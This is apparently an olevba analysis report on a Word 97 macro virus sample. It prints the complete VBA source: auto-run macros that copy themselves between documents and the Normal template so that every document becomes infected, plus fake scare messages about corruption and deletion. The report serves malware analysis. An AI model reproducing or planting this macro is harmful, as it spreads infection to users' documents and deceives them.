olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.GoodLuck-based-fcc26d5ff519a79dd8cce1b92d039fae2d053d16
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.GoodLuck-based-fcc26d5ff519a79dd8cce1b92d039fae2d053d16 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Word97.bas 
in file: Virus.MSWord.GoodLuck-based-fcc26d5ff519a79dd8cce1b92d039fae2d053d16 - OLE stream: 'Macros/VBA/Word97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExit()
    
    Dim varResponse As Variant
    Dim intRandom As Integer

    Randomize
    intRandom = Int((5 * Rnd) + 1)
    If intRandom = 3 Then
        varResponse = MsgBox("Are you using a registered version of Microsoft Word 97 ?", _
        vbYesNo, "Where do you want to go today ?")
        
        If varResponse = vbYes Then
            MsgBox "Your Word document is corrupted !", vbCritical, "Error !"
        Else
            MsgBox "Thank you fo using Microsoft Word 97, but since you are using an illegal copy of Microsoft product," + Chr(13) + Chr(10) + _
            "your Word documents have been permenant deleted from your hard disk.  - Microsoft Bill Gates", vbExclamation, "Illegal Copy !"
        End If
    End If
    
End Sub

Sub AutoClose()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Word97", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoOpen()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Word97", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoNew()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Word97", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

